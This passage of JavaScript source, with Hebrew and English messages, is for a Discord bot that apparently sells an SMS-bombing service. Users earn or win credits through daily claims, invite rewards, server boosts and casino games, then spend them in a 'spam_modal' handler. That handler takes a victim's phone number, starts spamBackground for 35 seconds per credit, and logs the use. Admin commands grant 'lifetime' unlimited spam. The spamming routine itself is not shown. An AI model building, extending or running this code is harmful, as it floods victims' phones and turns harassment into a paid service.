                        new ActionRowBuilder().addComponents(
                            new TextInputBuilder().setCustomId('pulses').setLabel('Credits to use').setPlaceholder('1 credit = 35 seconds').setMinLength(1).setMaxLength(3).setStyle(TextInputStyle.Short)
                        ),
                    );
                await interaction.showModal(modal);
            } else if (customId === 'v_bl') {
                await interaction.deferReply({ ephemeral: true });
                const bal = getBalanceDisplay(user.id);
                await interaction.followUp({ content: '💳 balance: **' + bal + '**', ephemeral: true });
            } else if (customId === 'free_credits_claim') {
                await interaction.deferReply({ ephemeral: true });
                const now = Date.now();
                const last = getLastFreeClaim(user.id);
                if (now - last < 86400000) {
                    const diff = 86400000 - (now - last);
                    const rh = Math.floor(diff / 3600000), rm = Math.floor((diff % 3600000) / 60000);
                    return interaction.followUp({ embeds: [new EmbedBuilder().setTitle('⏳ קיבלת תקרדיטים שלך להיום').setDescription('Come back in **' + rh + 'h ' + rm + 'm**').setColor(0x8b0000)], ephemeral: true });
                }
                addCredits(user.id, 5);
                setLastFreeClaim(user.id, now);
                const bal = getBalanceDisplay(user.id);
                await interaction.followUp({ embeds: [new EmbedBuilder().setTitle('🎁 +5 Credits!').setDescription('New balance: **' + bal + '** credits\nCome back tomorrow!').setColor(0xff0000)], ephemeral: true });
            } else if (customId === 'invite_credits_claim') {
                await interaction.deferReply({ ephemeral: true });
                const userData = getOrCreateUser(user.id);

                console.log('User ' + user.id + ' claiming invite credits: total_invites=' + userData.total_invites + ', claimed_invites=' + userData.claimed_invites);

                const totalInvites = userData.total_invites || 0;
                const claimedInvites = userData.claimed_invites || 0;
                const unclaimed = totalInvites - claimedInvites;

                console.log('Unclaimed invites: ' + unclaimed);

                if (unclaimed <= 0) {
                    return interaction.followUp({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle('❌ אין הזמנות חדשות למימוש')
                                .setDescription('הזמנת סך הכל: **' + totalInvites + '** אנשים.\nמימשאת כבר: **' + claimedInvites + '** הזמנות.\n\nהזמן עוד חברים לשרת באמצעות קישור קבוע כדי לקבל עוד קרדיטים! (1 הזמנה = 2 קרדיטים)')
                                .setColor(0x8b0000)
                        ],
                        ephemeral: true
                    });
                }

                const creditsToGrant = unclaimed * 2;
                userData.claimed_invites = totalInvites;
                addCredits(user.id, creditsToGrant);

                console.log('Granted ' + creditsToGrant + ' credits to user ' + user.id);

                return interaction.followUp({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('✅ הקרדיטים התווספו בהצלחה!')
                            .setDescription('מערכת זיהתה **' + unclaimed + '** הזמנות חדשות שלא מומשו!\nקיבלת: **' + creditsToGrant + '** קרדיטים לחשבון.\n\nמאזן הקרדיטים החדש שלך: **' + getBalanceDisplay(user.id) + '**')
                            .setColor(0xff0000)
                    ],
                    ephemeral: true
                });
            } else if (customId === 'boost_credits_claim') {
                await interaction.deferReply({ ephemeral: true });

                const guild = client.guilds.cache.get(CONFIG.GUILD_ID);
                const member = await guild?.members.fetch(user.id).catch(() => null);

                if (!member || !member.premiumSince) {
                    return interaction.followUp({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle('❌ לא נמצא בוסט פעיל')
                                .setDescription('הטבה זו מיועדת אך ורק למשתמשים שביצעו Boost לשרת שלנו!\nתן בוסט לשרת ותוכל לקבל 15 קרדיטים בכל יום באופן אוטומטי.')
                                .setColor(0x8b0000)
                        ],
                        ephemeral: true
                    });
                }

                const now = Date.now();
                const last = getLastBoostClaim(user.id);
                if (now - last < 86400000) {
                    const diff = 86400000 - (now - last);
                    const rh = Math.floor(diff / 3600000), rm = Math.floor((diff % 3600000) / 60000);
                    return interaction.followUp({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle('⏳ כבר מימשאת את הבונוס להיום')
                                .setDescription('תוכל לקבל שוב 15 קרדיטים בעוד: **' + rh + 'h ' + rm + 'm**')
                                .setColor(0x8b0000)
                        ],
                        ephemeral: true
                    });
                }

                addCredits(user.id, 15);
                setLastBoostClaim(user.id, now);
                const bal = getBalanceDisplay(user.id);

                await interaction.followUp({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('💎 תודה על הבוסט! +15 קרדיטים')
                            .setDescription('הקרדיטים היומיים שלך התווספו לחשבון.\nמאזן הקרדיטים החדש שלך: **' + bal + '** קבועים.\nנתראה מחר!')
                            .setColor(0xff0000)
                    ],
                    ephemeral: true
                });
            } else if (customId === 'claim_invite_rewards') {
                await interaction.deferReply({ ephemeral: true });

                console.log('[Invite Rewards] User ' + user.id + ' clicked claim button!');

                const userData = getOrCreateUser(user.id);
                const totalInvites = userData.total_invites || 0;
                const claimedMilestones = getClaimedMilestones(user.id);

                console.log('[Invite Rewards] - Total invites: ' + totalInvites);
                console.log('[Invite Rewards] - Claimed milestones: ' + claimedMilestones.join(', ') || 'none');
                console.log('[Invite Rewards] - Checking tiers: ' + JSON.stringify(INVITE_REWARD_TIERS));

                let rewardsClaimed = 0;
                let creditsEarned = 0;
                let rewardsText = '';

                // בודק כל שלב
                for (const tier of INVITE_REWARD_TIERS) {
                    if (totalInvites >= tier.invites && !claimedMilestones.includes(tier.invites)) {
                        // מביא את המתנה
                        addCredits(user.id, tier.credits);
                        addClaimedMilestone(user.id, tier.invites);
                        rewardsClaimed++;
                        creditsEarned += tier.credits;
                        rewardsText += '✅ ' + tier.invites + ' הזמנות → +' + tier.credits + ' קרדיטים\n';
                    }
                }

                // בונה את ההודעה
                const embed = new EmbedBuilder()
                    .setTitle('🎁 מתנות על הזמנות')
                    .setColor(rewardsClaimed > 0 ? 0x00ff00 : 0xff0000);

                if (rewardsClaimed > 0) {
                    embed.setDescription(
                        'הצלחת להזמין **' + totalInvites + '** אנשים!\n\n' +
                        'קיבלת מתנות חדשות:\n' + rewardsText + '\n' +
                        'סה"כ התקבלו: **+' + creditsEarned + '** קרדיטים\n\n' +
                        'מאזן חדש: **' + getBalanceDisplay(user.id) + '**'
                    );
                } else {
                    // נסביר מה המטרות
                    let nextTiersText = '';
                    for (const tier of INVITE_REWARD_TIERS) {
                        if (!claimedMilestones.includes(tier.invites)) {
                            const needed = tier.invites - totalInvites;
                            const status = totalInvites >= tier.invites ? '✅ זמין!' : '⏳ חסר ' + needed + ' הזמנות';
                            nextTiersText += tier.invites + ' הזמנות → ' + tier.credits + ' קרדיטים [' + status + ']\n';
                        }
                    }
                    embed.setDescription(
                        'הצלחת להזמין **' + totalInvites + '** אנשים!\n\n' +
                        'המטרות הנוכחיות:\n' + nextTiersText + '\n' +
                        (claimedMilestones.length > 0 ? 'שלבים שכבר ניצלת: ' + claimedMilestones.join(', ') + '\n' : '') +
                        'לא חסרים לך עוד שלבים כעת. תזמין עוד חברים!'
                    );
                }

                await interaction.followUp({ embeds: [embed], ephemeral: true });
            } else if (customId.startsWith('bj_')) {
                const game = activeGames.get(user.id);
                if (!game || game.type !== 'blackjack') return;

                if (gameTimeouts.has(user.id)) {
                    clearTimeout(gameTimeouts.get(user.id));
                }
                const timeout = setTimeout(() => {
                    if (activeGames.has(user.id)) {
                        endGame(user.id);
                        console.log('משחק Blackjack של המשתמש ' + user.id + ' נמחק בגלל פעילות לא רצויה');
                    }
                }, 5 * 60 * 1000);
                gameTimeouts.set(user.id, timeout);

                if (customId === 'bj_hit') {
                    game.playerHand.push(game.deck.pop());
                    const playerValue = calculateHand(game.playerHand);

                    if (playerValue > 21) {
                        endGame(user.id);
                        const stats = getOrCreateStats(user.id);
                        stats.blackjack.losses++;
                        stats.blackjack.profit -= game.bet;
                        saveDb();

                        try {
                            await interaction.update({
                                embeds: [
                                    new EmbedBuilder()
                                        .setTitle('💥 BUST! הפסדת!')
                                        .setDescription('**ידך:** ' + formatHand(game.playerHand) + ' (' + playerValue + ')\n**יד המסחר:** ' + formatHand(game.dealerHand) + ' (' + calculateHand(game.dealerHand) + ')\n\nהפסדת **' + game.bet + '** קרדיטים!')
                                        .setColor(0xff0000)
                                        .setFooter({ text: 'סטטיסטיקות: ניצחונות ' + stats.blackjack.wins + ' | הפסדים ' + stats.blackjack.losses + ' | תיקו ' + stats.blackjack.pushes })
                                ],
                                components: []
                            });
                        } catch (err) {
                            console.error('Error updating Blackjack hit:', err);
                        }
                        return;
                    }

                    const row = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('bj_hit').setLabel('Hit').setStyle(ButtonStyle.Primary),
                        new ButtonBuilder().setCustomId('bj_stand').setLabel('Stand').setStyle(ButtonStyle.Secondary),
                        new ButtonBuilder().setCustomId('bj_double').setLabel('Double').setStyle(ButtonStyle.Success).setDisabled(game.doubled || getCredits(user.id) < game.bet)
                    );

                    try {
                        await interaction.update({
                            embeds: [
                                new EmbedBuilder()
                                    .setTitle('♠️ Blackjack')
                                    .setDescription('**ידך:** ' + formatHand(game.playerHand) + ' (' + playerValue + ')\n**יד המסחר:** ' + formatHand(game.dealerHand.slice(0, 1)) + ' ?')
                                    .setColor(0x000000)
                            ],
                            components: [row]
                        });
                    } catch (err) {
                        console.error('Error updating Blackjack hit:', err);
                    }
                } else if (customId === 'bj_stand' || customId === 'bj_double') {
                    let doubled = false;
                    let bet = game.bet;

                    if (customId === 'bj_double') {
                        if (getCredits(user.id) < game.bet) return;
                        removeCredits(user.id, game.bet);
                        bet = game.bet * 2;
                        doubled = true;
                        game.playerHand.push(game.deck.pop());
                    }

                    const playerValue = calculateHand(game.playerHand);

                    if (playerValue > 21) {
                        endGame(user.id);
                        const stats = getOrCreateStats(user.id);
                        stats.blackjack.losses++;
                        stats.blackjack.profit -= bet;
                        saveDb();

                        try {
                            await interaction.update({
                                embeds: [
                                    new EmbedBuilder()
                                        .setTitle('💥 BUST! הפסדת!')
                                        .setDescription('**ידך:** ' + formatHand(game.playerHand) + ' (' + playerValue + ')\n**יד המסחר:** ' + formatHand(game.dealerHand) + ' (' + calculateHand(game.dealerHand) + ')\n\nהפסדת **' + bet + '** קרדיטים!')
                                        .setColor(0xff0000)
                                        .setFooter({ text: 'סטטיסטיקות: ניצחונות ' + stats.blackjack.wins + ' | הפסדים ' + stats.blackjack.losses + ' | תיקו ' + stats.blackjack.pushes })
                                ],
                                components: []
                            });
                        } catch (err) {
                            console.error('Error updating Blackjack double:', err);
                        }
                        return;
                    }

                    let dealerValue = calculateHand(game.dealerHand);
                    while (dealerValue < 17) {
                        game.dealerHand.push(game.deck.pop());
                        dealerValue = calculateHand(game.dealerHand);
                    }

                    let result = '';
                    let color = 0x000000;
                    const stats = getOrCreateStats(user.id);

                    if (dealerValue > 21 || playerValue > dealerValue) {
                        const win = doubled ? bet * 2 : bet * 2;
                        addCredits(user.id, win);
                        result = 'ניצחת! זכית ב**' + (doubled ? bet : game.bet) + '** קרדיטים!';
                        color = 0x00ff00;
                        stats.blackjack.wins++;
                        stats.blackjack.profit += (doubled ? bet : game.bet);
                    } else if (playerValue === dealerValue) {
                        addCredits(user.id, bet);
                        result = 'תיקו! ההשקעה הוחזרה.';
                        color = 0xffff00;
                        stats.blackjack.pushes++;
                    } else {
                        result = 'הפסדת **' + bet + '** קרדיטים!';
                        color = 0xff0000;
                        stats.blackjack.losses++;
                        stats.blackjack.profit -= bet;
                    }

                    endGame(user.id);
                    saveDb();

                    try {
                        await interaction.update({
                            embeds: [
                                new EmbedBuilder()
                                    .setTitle('♠️ Blackjack - תוצאה')
                                    .setDescription('**ידך:** ' + formatHand(game.playerHand) + ' (' + playerValue + ')\n**יד המסחר:** ' + formatHand(game.dealerHand) + ' (' + dealerValue + ')\n\n' + result)
                                    .setColor(color)
                                    .setFooter({ text: 'סטטיסטיקות: ניצחונות ' + stats.blackjack.wins + ' | הפסדים ' + stats.blackjack.losses + ' | תיקו ' + stats.blackjack.pushes + ' | רווח כולל ' + stats.blackjack.profit })
                            ],
                            components: []
                        });
                    } catch (err) {
                        console.error('Error updating Blackjack result:', err);
                    }
                }
            } else if (customId.startsWith('mine_')) {
                const game = activeGames.get(user.id);
                if (!game || game.type !== 'mines') return;

                if (gameTimeouts.has(user.id)) {
                    clearTimeout(gameTimeouts.get(user.id));
                }
                const timeout = setTimeout(() => {
                    if (activeGames.has(user.id)) {
                        endGame(user.id);
                        console.log('משחק Mines של המשתמש ' + user.id + ' נמחק בגלל פעילות לא רצויה');
                    }
                }, 5 * 60 * 1000);
                gameTimeouts.set(user.id, timeout);

                const index = parseInt(customId.split('_')[1]);
                if (game.revealed.includes(index)) return;

                if (game.mines.includes(index)) {
                    game.revealed.push(index);
                    endGame(user.id);

                    const stats = getOrCreateStats(user.id);
                    stats.mines.losses++;
                    stats.mines.profit -= game.bet;
                    saveDb();

                    const boardDisplay = [];
                    for (let i = 0; i < 20; i++) {
                        if (game.revealed.includes(i)) {
                            boardDisplay.push(game.mines.includes(i) ? '💣' : '💎');
                        } else {
                            boardDisplay.push('⬜');
                        }
                    }

                    try {
                        await interaction.update({
                            embeds: [
                                new EmbedBuilder()
                                    .setTitle('💥 BOOM! פגשת מוקש!')
                                    .setDescription('לוח המשחק:\n' + boardDisplay.slice(0, 5).join(' ') + '\n' + boardDisplay.slice(5, 10).join(' ') + '\n' + boardDisplay.slice(10, 15).join(' ') + '\n' + boardDisplay.slice(15, 20).join(' ') + '\n\nהפסדת **' + game.bet + '** קרדיטים!')
                                    .setColor(0xff0000)
                                    .setFooter({ text: 'סטטיסטיקות: ניצחונות ' + stats.mines.wins + ' | הפסדים ' + stats.mines.losses + ' | רווח כולל ' + stats.mines.profit })
                            ],
                            components: []
                        });
                    } catch (err) {
                        console.error('Error updating message on mine hit:', err);
                    }
                } else {
                    game.revealed.push(index);
                    game.multiplier = 1 + (game.revealed.length * 0.1);

                    const boardButtons = [];
                    for (let i = 0; i < 20; i++) {
                        if (game.revealed.includes(i)) {
                            boardButtons.push(new ButtonBuilder().setCustomId('mine_' + i).setEmoji('💎').setStyle(ButtonStyle.Secondary).setDisabled(true));
                        } else {
                            boardButtons.push(new ButtonBuilder().setCustomId('mine_' + i).setEmoji('⬜').setStyle(ButtonStyle.Secondary));
                        }
                    }

                    const rows = [];
                    for (let i = 0; i < 4; i++) {
                        rows.push(new ActionRowBuilder().addComponents(boardButtons.slice(i * 5, i * 5 + 5)));
                    }

                    rows.push(new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('mine_cashout').setLabel('גש עם ' + Math.floor(game.bet * game.multiplier)).setStyle(ButtonStyle.Success)
                    ));

                    try {
                        await interaction.update({
                            embeds: [
                                new EmbedBuilder()
                                    .setTitle('💎 Mines')
                                    .setDescription('חשפת **' + game.revealed.length + '** יהלומים!\n**מכפיל נוכחי:** ' + game.multiplier.toFixed(2) + 'x\n**תוצאה אפשרית:** ' + Math.floor(game.bet * game.multiplier) + ' קרדיטים')
                                    .setColor(0x000000)
                            ],
                            components: rows
                        });
                    } catch (err) {
                        console.error('Error updating message on diamond:', err);
                    }
                }
            } else if (customId === 'mine_cashout') {
                const game = activeGames.get(user.id);
                if (!game || game.type !== 'mines') return;

                const winnings = Math.floor(game.bet * game.multiplier);
                const profit = winnings - game.bet;
                addCredits(user.id, winnings);
                endGame(user.id);

                const stats = getOrCreateStats(user.id);
                stats.mines.wins++;
                stats.mines.profit += profit;
                saveDb();

                try {
                    await interaction.update({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle('✅ גשת בהצלחה!')
                                .setDescription('זכית **' + profit + '** קרדיטים!\n**מכפיל:** ' + game.multiplier.toFixed(2) + 'x\n**סך הכל:** ' + winnings + ' קרדיטים')
                                .setColor(0x00ff00)
                                .setFooter({ text: 'סטטיסטיקות: ניצחונות ' + stats.mines.wins + ' | הפסדים ' + stats.mines.losses + ' | רווח כולל ' + stats.mines.profit })
                        ],
                        components: []
                    });
                } catch (err) {
                    console.error('Error on cashout:', err);
                }
            }
        } else if (interaction.isModalSubmit()) {
            const { customId, user } = interaction;

            if (customId === 'spam_modal') {
                await interaction.deferReply({ ephemeral: true });
                const phone = interaction.fields.getTextInputValue('phone');
                const pulses = parseInt(interaction.fields.getTextInputValue('pulses'));
                const uid = interaction.user.id;
                if (pulses > 350) return interaction.followUp({ content: '❌ מקסימום 350 קרדיטים', ephemeral: true });
                if (isPhoneBlacklisted(phone)) return interaction.followUp({ content: '❌ This phone number is blacklisted.', ephemeral: true });

                if (phoneCooldowns.has(phone) && Date.now() < phoneCooldowns.get(phone)) {
                    const left = Math.ceil((phoneCooldowns.get(phone) - Date.now()) / 1000);
                    return interaction.followUp({ content: '⏳ This number is on cooldown. Try again in ' + left + 's.', ephemeral: true });
                }

                if (!hasLifetime(uid)) {
                    if (getCredits(uid) < pulses) return interaction.followUp({ content: '❌ Not enough credits.', ephemeral: true });
                    removeCredits(uid, pulses);
                }

                spamBackground(phone, pulses).catch(() => {});

                await interaction.followUp({ content: '🔥 Spam started on `' + phone + '` for ' + pulses + ' credits (' + pulses * 35 + 's).', ephemeral: true });

                // Send log message to the logs channel
                const logsChannel = client.channels.cache.get(CONFIG.SMS_LOGS_CHANNEL_ID);
                if (logsChannel) {
                    const userCredits = getBalanceDisplay(uid);
                    const logEmbed = new EmbedBuilder()
                        .setTitle('📱 שימוש בפאנל SMS')
                        .setColor(0xff9900)
                        .addFields(
                            { name: 'משתמש', value: `<@${uid}>`, inline: true },
                            { name: 'מספר טלפון', value: phone, inline: true },
                            { name: 'כמות קרדיטים', value: `${pulses}`, inline: true },
                            { name: 'מאזן נוכחי', value: userCredits, inline: true }
                        )
                        .setTimestamp();
                    await logsChannel.send({ embeds: [logEmbed] });
                }
            }
        } else if (interaction.isChatInputCommand()) {
            const { commandName, options, user } = interaction;

            if (commandName === 'addcredit' || commandName === 'removecredit' || commandName === 'lifetime' || commandName === 'removelifetime') {
                const isAdmin = CONFIG.ADMIN_IDS.includes(user.id);
                if (!isAdmin) return interaction.reply({ content: '❌ Admins only.', ephemeral: true });

                switch (commandName) {
                    case 'addcredit': {
                        const member = options.getMember('member');
                        const amount = options.getInteger('amount');
                        if (amount <= 0) return interaction.reply({ content: '❌ Must be positive.', ephemeral: true });
                        addCredits(member.id, amount);
                        const newBal = getBalanceDisplay(member.id);
                        await interaction.reply({ embeds: [new EmbedBuilder().setTitle('✅ Credits Added').addFields({ name: 'User', value: member.toString() }, { name: 'Added', value: String(amount) }, { name: 'Balance', value: newBal }).setColor(0xff0000)] });
                        break;
                    }
                    case 'removecredit': {
                        const member = options.getMember('member');
                        const amount = options.getInteger('amount');
                        if (amount <= 0) return interaction.reply({ content: '❌ Must be positive.', ephemeral: true });
                        removeCredits(member.id, amount);
                        const newBal = getBalanceDisplay(member.id);
                        await interaction.reply({ embeds: [new EmbedBuilder().setTitle('🗑️ Credits Removed').addFields({ name: 'User', value: member.toString() }, { name: 'Removed', value: String(amount) }, { name: 'Balance', value: newBal }).setColor(0x8b0000)] });
                        break;
                    }
                    case 'lifetime': {
                        const member = options.getMember('member');
                        const success = grantLifetime(member.id);
                        if (!success) {
                            return interaction.reply({ content: '❌ ' + member.toString() + ' already has lifetime status.', ephemeral: true });
                        }
                        await interaction.reply({ embeds: [new EmbedBuilder().setTitle('📱 Lifetime Granted').setDescription(member.toString() + ' now has unlimited spam.').setColor(0xffd700)] });
                        break;
                    }
                    case 'removelifetime': {
                        const member = options.getMember('member');
                        const success = revokeLifetime(member.id);
                        if (!success) {
                            return interaction.reply({ content: '❌ ' + member.toString() + ' doesn\'t have lifetime status.', ephemeral: true });
                        }
                        const restoredBal = getBalanceDisplay(member.id);
                        await interaction.reply({ embeds: [new EmbedBuilder().setTitle('⏏️ Lifetime Removed').setDescription(member.toString() + ' lifetime removed. Credits restored to **' + restoredBal + '**').setColor(0x808080)] });
                        break;
                    }
                }
                return;
            } else if (commandName === 'credits') {
                const bal = getBalanceDisplay(user.id);
                await interaction.reply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('💰 Your Credit Balance')
                            .setDescription('You have **' + bal + '** credits!')
                            .setColor(0x00ff00)
                    ],
                    ephemeral: true
                });
                return;
            } else if (commandName === 'endgame') {
                if (!activeGames.has(user.id)) {
                    return interaction.reply({
                        content: '❌ אין לך משחק פעיל כרגע!',
                        ephemeral: true
                    });
                }

                const game = activeGames.get(user.id);

                // If it's a Mines game, let's give them the option to cash out or just end
                if (game.type === 'mines' && game.revealed.length > 0) {
                    const winnings = Math.floor(game.bet * game.multiplier);
                    const profit = winnings - game.bet;
                    addCredits(user.id, winnings);

                    const stats = getOrCreateStats(user.id);
                    stats.mines.wins++;
                    stats.mines.profit += profit;
                    saveDb();

                    endGame(user.id);

                    await interaction.reply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle('✅ משחק הסתיים בהצלחה!')
                                .setDescription('גשת עם **' + profit + '** קרדיטים!\n**מכפיל:** ' + game.multiplier.toFixed(2) + 'x\n**סך הכל:** ' + winnings + ' קרדיטים')
                                .setColor(0x00ff00)
                        ],
                        ephemeral: true
                    });
                } else {
                    endGame(user.id);
                    await interaction.reply({
                        content: '✅ משחק הסתיים בהצלחה!',
                        ephemeral: true
                    });
                }
                return;
            } else if (commandName === 'stats') {
                const stats = getOrCreateStats(user.id);
                const embed = new EmbedBuilder()
                    .setTitle('📊 סטטיסטיקות קזינו שלך')
                    .setColor(0xffd700)
                    .addFields(
                        { name: '🪙 Coin Flip', value: 'ניצחונות: ' + stats.coinflip.wins + '\nהפסדים: ' + stats.coinflip.losses + '\nרווח כולל: ' + stats.coinflip.profit, inline: true },
                        { name: '♠️ Blackjack', value: 'ניצחונות: ' + stats.blackjack.wins + '\nהפסדים: ' + stats.blackjack.losses + '\nתיקו: ' + stats.blackjack.pushes + '\nרווח כולל: ' + stats.blackjack.profit, inline: true },
                        { name: '🎰 Roulette', value: 'ניצחונות: ' + stats.roulette.wins + '\nהפסדים: ' + stats.roulette.losses + '\nרווח כולל: ' + stats.roulette.profit, inline: true },
                        { name: '💣 Mines', value: 'ניצחונות: ' + stats.mines.wins + '\nהפסדים: ' + stats.mines.losses + '\nרווח כולל: ' + stats.mines.profit, inline: true }
                    )
                    .setTimestamp();

                await interaction.reply({ embeds: [embed], ephemeral: true });
                return;
            }

            if (hasLifetime(user.id)) {
                return interaction.reply({ content: '❌ משתמשי Lifetime לא יכולים לשחק בקזינו!', ephemeral: true });
            }

            if (activeGames.has(user.id)) {
                return interaction.reply({ content: '❌ יש לך משחק פעיל כרגע! השתמש ב-/endgame כדי לסיים אותו.', ephemeral: true });
            }

            if (commandName === 'coinflip') {
                if (interaction.channelId !== CONFIG.CASINO_COINFLIP_CHANNEL) {
                    return interaction.reply({ content: '❌ משחק זה זמין רק בערוץ <#' + CONFIG.CASINO_COINFLIP_CHANNEL + '>!', ephemeral: true });
                }

                const amount = options.getInteger('amount');
                const choice = options.getString('choice');

                if (getCredits(user.id) < amount) {
                    return interaction.reply({ content: '❌ אין לך מספיק קרדיטים!', ephemeral: true });
                }

                await interaction.deferReply();
                removeCredits(user.id, amount);
                await delay(500);

                const result = Math.random() < 0.5 ? 'heads' : 'tails';
                const won = result === choice;

                const stats = getOrCreateStats(user.id);
                let profit = 0;

                if (won) {
                    profit = amount;
                    addCredits(user.id, amount * 2);
                    stats.coinflip.wins++;
                    stats.coinflip.profit += profit;
                } else {
                    stats.coinflip.losses++;
                    stats.coinflip.profit -= amount;
                }
                saveDb();

                const embed = new EmbedBuilder()
                    .setTitle(won ? '🪙 ניצחת!' : '🪙 הפסדת!')
                    .setDescription('**בחירתך:** ' + (choice === 'heads' ? 'עץ' : 'מטע') + '\n**התוצאה:** ' + (result === 'heads' ? 'עץ' : 'מטע') + '\n**תוצאה:** ' + (won ? '+' + profit : '-' + amount) + ' קרדיטים\n**מאזן חדש:** ' + getBalanceDisplay(user.id))
                    .setColor(won ? 0x00ff00 : 0xff0000)
                    .setFooter({ text: 'סטטיסטיקות: ניצחונות ' + stats.coinflip.wins + ' | הפסדים ' + stats.coinflip.losses + ' | רווח כולל ' + stats.coinflip.profit })
                    .setTimestamp();

                await interaction.followUp({ embeds: [embed] });
            } else if (commandName === 'blackjack') {
                if (interaction.channelId !== CONFIG.CASINO_BLACKJACK_CHANNEL) {
                    return interaction.reply({ content: '❌ משחק זה זמין רק בערוץ <#' + CONFIG.CASINO_BLACKJACK_CHANNEL + '>!', ephemeral: true });
                }

                const amount = options.getInteger('amount');
                if (getCredits(user.id) < amount) {
                    return interaction.reply({ content: '❌ אין לך מספיק קרדיטים!', ephemeral: true });
                }

                removeCredits(user.id, amount);
                const deck = createDeck();
                const playerHand = [deck.pop(), deck.pop()];
                const dealerHand = [deck.pop(), deck.pop()];
                const playerValue = calculateHand(playerHand);
                const dealerValue = calculateHand(dealerHand);

                if (playerValue === 21) {
                    const stats = getOrCreateStats(user.id);
                    const winnings = Math.floor(amount * 2.5);
                    const profit = winnings - amount;
                    addCredits(user.id, winnings);
                    stats.blackjack.wins++;
                    stats.blackjack.profit += profit;
                    saveDb();

                    const embed = new EmbedBuilder()
                        .setTitle('♠️ BLACKJACK! 🎉')
                        .setDescription('**ידך:** ' + formatHand(playerHand) + ' (' + playerValue + ')\n**יד המסחר:** ' + formatHand(dealerHand) + ' (' + dealerValue + ')\n\nזכית **' + profit + '** קרדיטים! (1.5x)\n**מאזן חדש:** ' + getBalanceDisplay(user.id))
                        .setColor(0xffd700)
                        .setFooter({ text: 'סטטיסטיקות: ניצחונות ' + stats.blackjack.wins + ' | הפסדים ' + stats.blackjack.losses + ' | תיקו ' + stats.blackjack.pushes })
                        .setTimestamp();

                    return interaction.reply({ embeds: [embed] });
                }

                startGame(user.id, {
                    type: 'blackjack',
                    bet: amount,
                    deck,
                    playerHand,
                    dealerHand,
                    doubled: false
                });

                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId('bj_hit').setLabel('Hit').setStyle(ButtonStyle.Primary),
                    new ButtonBuilder().setCustomId('bj_stand').setLabel('Stand').setStyle(ButtonStyle.Secondary),
                    new ButtonBuilder().setCustomId('bj_double').setLabel('Double').setStyle(ButtonStyle.Success).setDisabled(getCredits(user.id) < amount)
                );

                const embed = new EmbedBuilder()
                    .setTitle('♠️ Blackjack')
                    .setDescription('**ידך:** ' + formatHand(playerHand) + ' (' + playerValue + ')\n**יד המסחר:** ' + formatHand(dealerHand.slice(0, 1)) + ' ?')
                    .setColor(0x000000)
                    .addFields({ name: 'חוקים', value: 'Hit - קח קלף נוסף\nStand - עצור\nDouble - הכפל השקעה וקח קלף אחד נוסף' })
                    .setTimestamp();

                await interaction.reply({ embeds: [embed], components: [row] });
            } else if (commandName === 'roulette') {
                if (interaction.channelId !== CONFIG.CASINO_ROULETTE_CHANNEL) {
                    return interaction.reply({ content: '❌ משחק זה זמין רק בערוץ <#' + CONFIG.CASINO_ROULETTE_CHANNEL + '>!', ephemeral: true });
                }

                const amount = options.getInteger('amount');
                const bet = options.getString('bet').toLowerCase();

                if (getCredits(user.id) < amount) {
                    return interaction.reply({ content: '❌ אין לך מספיק קרדיטים!', ephemeral: true });
                }

                const validBets = ['red', 'black', 'green'];
                const numBet = parseInt(bet);
                if (!validBets.includes(bet) && (isNaN(numBet) || numBet < 0 || numBet > 36)) {
                    return interaction.reply({ content: '❌ הימור לא חוקי! בחר: red, black, green או מספר בין 0-36.', ephemeral: true });
                }

                await interaction.deferReply();
                removeCredits(user.id, amount);
                await delay(1000);

                const result = rouletteNumbers[Math.floor(Math.random() * rouletteNumbers.length)];
                let won = false;
                let multiplier = 0;
                let betType = '';

                if (bet === 'red' && result.color === 'red') {
                    won = true; multiplier = 2; betType = 'אדום';
                } else if (bet === 'black' && result.color === 'black') {
                    won = true; multiplier = 2; betType = 'שחור';
                } else if (bet === 'green' && result.color === 'green') {
                    won = true; multiplier = 36; betType = 'ירוק';
                } else if (!isNaN(numBet) && numBet === result.num) {
                    won = true; multiplier = 36; betType = 'מספר ' + numBet;
                }

                const stats = getOrCreateStats(user.id);
                let profit = 0;

                if (won) {
                    profit = (amount * multiplier) - amount;
                    addCredits(user.id, amount * multiplier);
                    stats.roulette.wins++;
                    stats.roulette.profit += profit;
                } else {
                    stats.roulette.losses++;
                    stats.roulette.profit -= amount;
                }
                saveDb();

                const resultColorEmoji = result.color === 'red' ? '🔴' : result.color === 'black' ? '⚫' : '🟢';
                const embed = new EmbedBuilder()
                    .setTitle(won ? '🎰 ניצחת!' : '🎰 הפסדת!')
                    .setDescription('**ההימור שלך:** ' + (betType || bet) + '\n**התוצאה:** ' + resultColorEmoji + ' ' + result.num + ' (' + (result.color === 'red' ? 'אדום' : result.color === 'black' ? 'שחור' : 'ירוק') + ')\n**תוצאה:** ' + (won ? '+' + profit : '-' + amount) + ' קרדיטים\n**מאזן חדש:** ' + getBalanceDisplay(user.id))
                    .setColor(won ? 0x00ff00 : 0xff0000)
                    .setFooter({ text: 'סטטיסטיקות: ניצחונות ' + stats.roulette.wins + ' | הפסדים ' + stats.roulette.losses + ' | רווח כולל ' + stats.roulette.profit })
                    .setTimestamp();

                await interaction.followUp({ embeds: [embed] });
            } else if (commandName === 'mines') {
                if (interaction.channelId !== CONFIG.CASINO_MINES_CHANNEL) {
                    return interaction.reply({ content: '❌ משחק זה זמין רק בערוץ <#' + CONFIG.CASINO_MINES_CHANNEL + '>!', ephemeral: true });
                }

                const amount = options.getInteger('amount');
                const minesCount = options.getInteger('mines');

                if (getCredits(user.id) < amount) {
                    return interaction.reply({ content: '❌ אין לך מספיק קרדיטים!', ephemeral: true });
                }

                removeCredits(user.id, amount);

                const mines = [];
                while (mines.length < minesCount) {
                    const r = Math.floor(Math.random() * 20);
                    if (!mines.includes(r)) mines.push(r);
                }

                startGame(user.id, {
                    type: 'mines',
                    bet: amount,
                    mines,
                    revealed: [],
                    multiplier: 1
                });

                const boardButtons = [];
                for (let i = 0; i < 20; i++) {
